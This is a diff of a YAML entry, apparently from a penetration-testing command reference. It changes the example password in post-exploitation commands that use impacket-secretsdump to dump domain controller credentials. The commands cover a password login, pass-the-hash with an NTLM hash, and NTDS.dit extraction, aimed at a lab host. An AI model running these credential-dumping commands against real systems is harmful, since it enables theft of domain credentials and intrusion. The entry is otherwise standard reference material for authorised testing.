@@ -8,16 +8,16 @@ description: |
     Target DC: 10.10.10.1
     Domain: test.local
     Username: admin
-    Password: password123
+    Password: P@ssw0rd123
 command: |
   # With password
-  impacket-secretsdump test.local/admin:password123@10.10.10.1
+  impacket-secretsdump test.local/admin:P@ssw0rd123@10.10.10.1
 
   # With NTLM hash (Pass-the-Hash)
   impacket-secretsdump test.local/admin@10.10.10.1 -hashes :aad3b435b51404eeaad3b435b51404ee
 
   # Just NTDS.dit
-  impacket-secretsdump test.local/admin:password123@10.10.10.1 -just-dc-ntlm
+  impacket-secretsdump test.local/admin:P@ssw0rd123@10.10.10.1 -just-dc-ntlm
 phase:
   - Post-Exploitation
 target_os:
